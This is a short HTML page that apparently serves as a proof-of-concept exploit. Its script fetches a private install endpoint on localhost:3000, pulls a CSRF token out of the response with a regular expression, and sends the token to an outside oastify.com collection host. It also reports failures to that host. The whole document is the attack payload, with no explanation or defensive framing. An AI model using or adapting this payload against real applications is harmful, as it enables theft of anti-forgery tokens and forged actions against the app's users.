<!DOCTYPE html>
<html>
<body>
<script>
fetch("http://localhost:3000/apiv1/private/install")
  .then(res => res.text())
  .then(html => {
    // Try to extract CSRF token from HTML
    const match = html.match(/name="csrfToken" value="([^"]+)"/);
    const token = match ? match[1] : "no_token";
    // Send token to your server
    fetch("https://qe8wbhjtwtimmi0i3q6mpnxufllc96xv.oastify.com/log?csrf=" + encodeURIComponent(token));
  })
  .catch(e => {
    // Even log error to your server to debug
    fetch("https://qe8wbhjtwtimmi0i3q6mpnxufllc96xv.oastify.com/log?error=fetch_failed");
  });
</script>
</body>
</html>
